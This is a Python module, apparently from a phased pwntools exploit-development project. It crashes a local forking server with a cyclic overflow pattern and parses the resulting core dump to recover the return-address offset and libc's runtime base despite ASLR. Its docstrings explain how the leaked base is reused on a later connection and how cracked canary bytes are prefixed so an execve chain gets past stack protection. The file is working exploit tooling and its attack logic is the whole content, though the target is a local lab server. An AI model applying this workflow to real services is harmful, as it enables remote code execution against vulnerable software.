import glob
import time
from dataclasses import dataclass
from pathlib import Path

from pwn import cyclic, cyclic_find, p64, remote
from pwnlib.elf.corefile import Corefile

from .server import ForkingServer

_HEADER_MATCH_LEN = 64
_CRASH_PATTERN_LENGTH = 512
_CORE_WAIT_TIMEOUT = 5.0
_CORE_POLL_INTERVAL = 0.1
_TARGET_ARCH = "amd64"  # this project only ever targets 64-bit Linux x86-64
_MAX_CRASH_ATTEMPTS = 3


class LeakError(Exception):
    pass


class _StaleCoreError(Exception):
    """Internal signal only: the corefile _wait_for_crash_core() handed
    back doesn't match the crash *this* attempt caused (its own cleanup
    means it can't be an unrelated run's leftover — but a rapid trailing
    crash from something else using the same server/cwd, e.g. the last of
    crack_canary()'s thousands of guess-and-cleanup cycles, can still land
    a stale-but-parseable core here right as a fresh one starts). Retried
    with a brand new crash rather than treated as a hard failure — same
    race class offset/finder.py's _crash_and_get_rip already retries."""


@dataclass(frozen=True)
class LeakResult:
    offset: int
    libc_base: int


def probe(server: ForkingServer, libc_path: str | Path, prefix: bytes = b"") -> LeakResult:
    """Crashes one connection to `server` and recovers both the overflow
    offset and libc's real runtime base from the resulting crash dump —
    same byte-matching-a-mapped-file-header technique Phase 4 used for
    libc's base (chainer/exploit.py), generalized to also read the crash
    RIP for the offset (same technique offset/finder.py uses), all from a
    single crash against a genuinely ASLR'd target. The result is then
    reused by a *separate*, later connection to the same still-running
    server — valid because fork() never re-randomizes a child's memory
    layout, not because ASLR was disabled anywhere.

    `prefix` is sent before the cyclic pattern, unchanged — for a
    canary-protected target (Phase 6's canary/ module), passing the
    already-cracked canary bytes as `prefix` clears the canary check first,
    so the cyclic pattern reaches the return address instead of tripping
    __stack_chk_fail. `offset` is still relative to the start of the cyclic
    part (i.e. right after `prefix`), matching how build_canary_execve_chain()
    composes the final payload as `prefix + b"A" * offset + chain.payload()`.
    """
    last_error = None
    for _ in range(_MAX_CRASH_ATTEMPTS):
        try:
            return _probe_once(server, libc_path, prefix)
        except _StaleCoreError as exc:
            last_error = exc
    raise LeakError(
        f"could not reliably read a matching crash corefile after "
        f"{_MAX_CRASH_ATTEMPTS} attempts (likely a stale-core race); last error: {last_error}"
    )


def _probe_once(server: ForkingServer, libc_path: str | Path, prefix: bytes) -> LeakResult:
    io = remote("127.0.0.1", server.port)
    io.send(prefix + cyclic(_CRASH_PATTERN_LENGTH))
    io.recvall(timeout=2.0)
    io.close()

    core = _wait_for_crash_core(server)
    try:
        offset = cyclic_find(p64(core.rip))
        if offset == -1:
            raise _StaleCoreError(
                f"crash rip 0x{core.rip:x} not found in cyclic pattern "
                f"(pattern_length={_CRASH_PATTERN_LENGTH} may be too short)"
            )

        libc_header = Path(libc_path).read_bytes()[:_HEADER_MATCH_LEN]
        libc_base = None
        for mapping in core.mappings:
            if mapping.data[:_HEADER_MATCH_LEN] == libc_header:
                libc_base = mapping.start
                break
        if libc_base is None:
            raise _StaleCoreError(f"could not locate {libc_path}'s runtime base in the crash corefile")
    finally:
        core.file.close()

    return LeakResult(offset=offset, libc_base=libc_base)


def _wait_for_crash_core(server: ForkingServer) -> Corefile:
    """Locates the target's own crash corefile, whether this process is
    running under QEMU user-mode emulation or natively.

    Under QEMU (e.g. this project's devcontainer), a guest crash produces
    *two* core files: `qemu_<basename>_*.core`, written by QEMU itself with
    the guest's real x86-64 state, and a plain `core` file, which is the
    *qemu-x86_64 interpreter's own* host-architecture (e.g. aarch64) dump —
    irrelevant here. Running natively (e.g. a native x86-64 CI runner),
    there's no QEMU involved at all: the target crashes directly and the
    OS writes a single, directly-usable `core` file, and no `qemu_*` file
    ever appears.

    Rather than assume one environment or the other, every candidate that
    shows up gets parsed and checked by its own ELF architecture — the
    interpreter's host-arch dump gets discarded regardless of which glob
    it matched, so this works unmodified in either environment. Each
    ForkingServer has its own temp cwd, so there's no risk of an unrelated
    run's corefile matching.
    """
    basename = Path(server.binary_path).name
    qemu_pattern = str(server.cwd / f"qemu_{basename}_*.core")
    plain_core_path = server.cwd / "core"
    deadline = time.monotonic() + _CORE_WAIT_TIMEOUT
    while time.monotonic() < deadline:
        candidates = sorted(glob.glob(qemu_pattern))
        if plain_core_path.exists():
            candidates.append(str(plain_core_path))
        for candidate in candidates:
            core_path = Path(candidate)
            try:
                core = Corefile(str(core_path))
            except Exception:
                # most likely caught mid-write (the file exists but isn't
                # fully flushed yet) — leave it for the next poll rather
                # than deleting a corefile that hasn't finished landing.
                continue
            if core.arch != _TARGET_ARCH:
                core.file.close()
                core_path.unlink(missing_ok=True)
                continue
            core_path.unlink(missing_ok=True)
            for stray in glob.glob(qemu_pattern):
                Path(stray).unlink(missing_ok=True)
            plain_core_path.unlink(missing_ok=True)
            return core
        time.sleep(_CORE_POLL_INTERVAL)
    raise LeakError(f"target crashed but no core dump appeared within {_CORE_WAIT_TIMEOUT}s")
